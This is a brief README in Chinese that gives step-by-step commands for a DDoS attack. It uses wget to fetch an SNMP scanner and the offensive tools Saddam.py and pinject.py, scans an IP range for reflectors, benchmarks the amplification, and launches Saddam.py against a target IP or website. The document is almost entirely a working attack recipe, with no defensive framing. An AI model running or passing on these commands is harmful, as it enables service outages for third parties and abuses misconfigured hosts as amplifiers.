# 使用說明
snmp漏洞主機掃瞄

下載腳本

wget https://raw.githubusercontent.com/wartw98/test/master/snmpscan

使用腳本
./snmpscan 開始ip 結束ip 儲存檔案名稱 數值(建議10~100之間) 10

攻擊腳本下載

wget https://raw.githubusercontent.com/OffensivePython/Saddam/master/Saddam.py

wget https://raw.githubusercontent.com/OffensivePython/Pinject/master/pinject.py

攻擊腳本使用

測試倍數

python Saddam.py benchmark -s 掃瞄後的檔案

使用攻擊

python Saddam.py 攻擊ip或是網址 -s 掃瞄後的檔案
